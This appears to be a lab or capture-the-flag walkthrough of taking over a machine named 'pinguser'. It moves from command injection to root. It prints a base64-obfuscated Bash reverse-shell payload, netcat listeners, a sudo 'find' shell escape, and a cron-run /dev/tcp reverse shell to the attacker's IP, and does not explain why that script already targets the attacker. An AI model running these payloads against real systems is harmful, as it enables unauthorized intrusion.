First, we perform a scan and discover that ports 80 and 9999 are open.
There is a web application running on port 9999. By analyzing the application, we identify a command injection vulnerability. Using this vulnerability, we are able to gain access to the system.

The initial scan is done using RustScan:

```
/snap/bin/rustscan -a 192.168.1.11 -r 1-65535 --ulimit 5000
```

RustScan Output:

```
Open 192.168.1.11:22
Open 192.168.1.11:80
Open 192.168.1.11:9999
[~] Starting Script(s)
dnet: Failed to open device wlan0
QUITTING!
[!] Error Exit code = 1# WriteUp
```

After identifying the command injection vulnerability in the web application running on port 9999, we exploit it to gain remote access to the system.

We inject the following payload, which establishes a reverse shell connection to our attacker machine:
```
1.1.1.1; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOS80NDQ0IDA+JjEn | base64 -d | bash
```

This payload uses base64 to encode a simple Bash reverse shell and avoids detection by some filters. Once decoded and executed, it connects back to our listener on port 4444.

On our attacker machine, we start a listener using netcat:

```
nc -lvnp 4444
```

We receive a reverse shell connection:

```
listening on [any] 4444 ...
connect to [192.168.1.9] from (UNKNOWN) [192.168.1.11] 57322
bash: cannot set terminal process group (825): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pinguser:/var/www/blog$
```

We now have a shell as the www-data user on the target machine and are inside the /var/www/blog directory.

Privilege Escalation

After gaining a reverse shell as the www-data user, we enumerate user privileges by running:

```
sudo -l
```

Output:

```
Matching Defaults entries for www-data on pinguser:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on pinguser:
    (pinguser) NOPASSWD: /usr/bin/find
```

This indicates that the www-data user can run /usr/bin/find as the pinguser user without providing a password.

We exploit this configuration using the following command to escalate privileges to the pinguser user:

```
sudo -u pinguser /usr/bin/find . -exec /bin/sh -p \; -quit
```

We then upgrade to a fully interactive shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we have a shell as the pinguser user:

```
pinguser@pinguser:/var/www/blog$
```

Root Privilege Escalation

After escalating from www-data to pinguser, we enumerate further by checking the contents of the system-wide crontab file:

```
cat /etc/crontab
```

We find the following scheduled cron job:

```
* * * * * root bash /opt/rootscript.sh
```

This cron job runs the script /opt/rootscript.sh every minute with root privileges.

We navigate to /opt and examine the contents of the script:

```
cd /opt
ls
cat rootscript.sh
```

Script contents:

```
bash -i >& /dev/tcp/192.168.1.9/5555 0>&1
```

This script is already set up to open a reverse shell to our machine (192.168.1.9) on port 5555. To receive the root shell, we simply start a listener on our machine:

```
nc -nvlp 5555
```

After about a minute, we receive the reverse shell as root:

```
listening on [any] 5555 ...
connect to [192.168.1.9] from (UNKNOWN) [192.168.1.11] 38444
bash: cannot set terminal process group (1423): Inappropriate ioctl for device
bash: no job control in this shell
root@pinguser:~#
```

We now have full root access to the target system.
